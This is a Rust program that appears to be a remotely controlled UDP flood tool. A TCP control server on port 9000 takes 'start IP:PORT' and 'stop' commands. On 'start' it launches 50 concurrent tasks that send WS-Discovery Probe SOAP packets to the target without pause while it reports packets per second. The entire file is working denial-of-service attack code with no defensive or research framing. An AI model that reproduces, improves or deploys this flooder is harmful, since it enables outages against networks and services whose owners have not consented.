use tokio::net::{TcpListener, TcpStream, UdpSocket};
use tokio::io::{AsyncBufReadExt, BufReader, AsyncWriteExt};
use tokio::time::{sleep, Duration};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use anyhow::Result;

const THREADS: usize = 50;
const BURST_SIZE: usize = 5;
const CONTROL_PORT: u16 = 9000;

fn build_payload() -> Vec<u8> {
    let payload = br#"<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery">
  <e:Header>
    <w:MessageID>urn:uuid:STATIC-UUID-1234</w:MessageID>
    <w:To>urn:schemas-xmlsoap-org:ws:2005/04/discovery</w:To>
    <w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe>
      <d:Types>dn:NetworkVideoTransmitter</d:Types>
    </d:Probe>
  </e:Body>
</e:Envelope>"#;
    payload.to_vec()
}

async fn handle_flood(target: String, packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) -> Result<()> {
    let socket = UdpSocket::bind("0.0.0.0:0").await?;
    let payload = build_payload();

    while running.load(Ordering::Relaxed) == 1 {
        for _ in 0..BURST_SIZE {
            // We don't want to error out if a single send fails, just continue
            let _ = socket.send_to(&payload, &target).await;
            packet_count.fetch_add(1, Ordering::Relaxed);
        }
    }
    Ok(())
}

async fn pps_monitor(packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) {
    let mut last_count = 0;
    while running.load(Ordering::Relaxed) == 1 {
        sleep(Duration::from_secs(1)).await;
        let current = packet_count.load(Ordering::Relaxed);
        println!("PPS: {}", current - last_count);
        last_count = current;
    }
}

async fn safe_write(writer: &mut tokio::net::tcp::OwnedWriteHalf, message: &[u8]) -> Result<()> {
    match writer.write_all(message).await {
        Ok(_) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::BrokenPipe => Ok(()),
        Err(e) => Err(e.into()),
    }
}

async fn handle_client(stream: TcpStream) -> Result<()> {
    let (reader, mut writer) = stream.into_split();
    let reader = BufReader::new(reader);
    let mut lines = reader.lines();

    // State to hold the running flood tasks and their control flag
    let mut flood_state: Option<(Vec<tokio::task::JoinHandle<Result<()>>>, tokio::task::JoinHandle<()>, Arc<AtomicU64>)> = None;

    // Welcome message
    let _ = safe_write(&mut writer, b"--- UDP Flood Control ---\nCommands:\n  start <IP:PORT>\n  stop\n  quit\n-------------------------\n").await;

    while let Ok(Some(line)) = lines.next_line().await {
        let parts: Vec<&str> = line.trim().split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }

        match parts[0] {
            "start" => {
                if flood_state.is_some() {
                    let _ = safe_write(&mut writer, b"Error: A flood is already in progress. Use 'stop' first.\n").await;
                    continue;
                }

                if parts.len() != 2 {
                    let _ = safe_write(&mut writer, b"Error: Invalid format. Use: start IP:PORT\n").await;
                    continue;
                }
                
                let target = parts[1].to_string();
                if target.parse::<std::net::SocketAddr>().is_err() {
                     let _ = safe_write(&mut writer, b"Error: Invalid target format. Use a valid IP:PORT.\n").await;
                     continue;
                }

                println!("Starting flood for target: {}", target);
                let _ = safe_write(&mut writer, format!("Starting flood for target: {}\n", target).as_bytes()).await;

                let packet_count = Arc::new(AtomicU64::new(0));
                let running = Arc::new(AtomicU64::new(1));

                let monitor_handle = {
                    let pc = Arc::clone(&packet_count);
                    let run = Arc::clone(&running);
                    tokio::spawn(pps_monitor(pc, run))
                };

                let mut flood_tasks = vec![];
                for _ in 0..THREADS {
                    let pc = Arc::clone(&packet_count);
                    let run = Arc::clone(&running);
                    let tgt = target.clone();
                    flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
                }

                flood_state = Some((flood_tasks, monitor_handle, running));
            }
            "stop" => {
                if let Some((flood_tasks, monitor_handle, running)) = flood_state.take() {
                    println!("Stopping flood...");
                    let _ = safe_write(&mut writer, b"Stopping flood...\n").await;
                    
                    running.store(0, Ordering::Relaxed);

                    for task in flood_tasks {
                        if let Err(e) = task.await {
                            eprintln!("Flood task error on shutdown: {}", e);
                        }
                    }
                    
                    let _ = monitor_handle.await;
                    
                    println!("Flood stopped.");
                    let _ = safe_write(&mut writer, b"Flood stopped.\n").await;
                } else {
                    let _ = safe_write(&mut writer, b"Error: No flood is currently running.\n").await;
                }
            }
            "quit" => {
                break;
            }
            _ => {
                let _ = safe_write(&mut writer, b"Error: Unknown command.\n").await;
            }
        }
    }

    // Cleanup: If the client disconnects while a flood is running, stop it.
    if let Some((flood_tasks, monitor_handle, running)) = flood_state.take() {
        println!("Client disconnected, stopping active flood...");
        running.store(0, Ordering::Relaxed);
        for task in flood_tasks {
            let _ = task.await; // Wait for tasks to finish
        }
        let _ = monitor_handle.await;
        println!("Flood stopped due to client disconnect.");
    }

    println!("Client disconnected");
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let listener = TcpListener::bind(("0.0.0.0", CONTROL_PORT)).await?;
    println!("TCP control server listening on port {}", CONTROL_PORT);

    loop {
        match listener.accept().await {
            Ok((stream, addr)) => {
                println!("New connection from: {}", addr);
                tokio::spawn(async move {
                    if let Err(e) = handle_client(stream).await {
                        eprintln!("Error handling client {}: {}", addr, e);
                    }
                });
            }
            Err(e) => {
                eprintln!("Error accepting connection: {}", e);
            }
        }
    }
}
